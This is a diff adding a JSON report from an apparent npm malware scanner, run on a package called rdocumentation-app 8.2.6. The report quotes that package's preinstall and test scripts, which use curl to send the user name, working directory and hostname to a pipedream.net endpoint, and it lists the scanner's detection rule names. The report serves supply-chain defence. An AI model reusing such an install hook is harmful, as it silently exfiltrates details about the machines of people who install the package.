@@ -1,0 +1,33 @@
+{
+    "issues": 3,
+    "errors": {},
+    "results": {
+        "npm-steganography": {},
+        "npm-exec-base64": {},
+        "npm-silent-process-execution": {},
+        "npm-exfiltrate-sensitive-data": {},
+        "npm-serialize-environment": {},
+        "npm-install-script": [
+            {
+                "location": "package/package.json:8",
+                "code": "    \"preinstall\": \"curl \\\"https://eokxi6shvostsan.m.pipedream.net/datacamp?user=$(whoami)&path=$(pwd)&hostname=$(hostname -f)\\\"\"\n",
+                "message": "The package.json has a script automatically running when the package is installed"
+            }
+        ],
+        "npm-obfuscation": {},
+        "shady-links": [
+            {
+                "location": "package/package.json:7",
+                "code": "    \"test\": \"curl \\\"https://eokxi6shvostsan.m.pipedream.net/datacamp?user=$(whoami)&path=$(pwd)&hostname=$(hostname -f)\\\"\",\n",
+                "message": "This package contains an URL to a domain with a suspicious extension"
+            },
+            {
+                "location": "package/package.json:8",
+                "code": "    \"preinstall\": \"curl \\\"https://eokxi6shvostsan.m.pipedream.net/datacamp?user=$(whoami)&path=$(pwd)&hostname=$(hostname -f)\\\"\"\n",
+                "message": "This package contains an URL to a domain with a suspicious extension"
+            }
+        ],
+        "npm-dll-hijacking": {}
+    },
+    "path": "./dataset/npm/rdocumentation-app-8.2.6"
+}
